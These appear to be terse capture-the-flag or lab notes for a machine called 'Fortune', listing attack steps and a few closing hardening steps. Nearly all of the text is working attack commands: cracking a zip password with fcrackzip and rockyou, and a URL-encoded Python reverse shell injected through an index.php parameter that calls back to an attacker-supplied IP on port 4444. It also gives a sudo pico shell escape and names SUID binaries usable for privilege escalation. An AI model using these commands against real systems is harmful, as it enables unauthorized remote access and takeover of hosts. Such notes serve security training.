Fortune

**Autogens passwords**

## zip file
`nc IP 3333 | base64 -d > output.zip`

`fcrackzip -v -u -D -p /usr/share/wordlists/rockyou.txt output.zip`

ssh using creds

`passwd`

Alternate: `http://<IP>/_styles/index.php?luck=python%20-c%20%27import%20socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((%22<YOURIP>%22,4444));os.dup2(s.fileno(),0);%20os.dup2(s.fileno(),1);%20os.dup2(s.fileno(),2);p=subprocess.call([%22/bin/sh%22,%22-i%22]);%27` replace ip and yourip, port 4444, takes a few tries to work

```
sudo pico
^R^X
reset; sh 1>&0 2>&0
```


SUID exploits (/usr/bin):
- xargs
- nice
- find

edit /var/www/html/_styles/index.php

crontab -e, remove 

Fix sudoers file `visudo`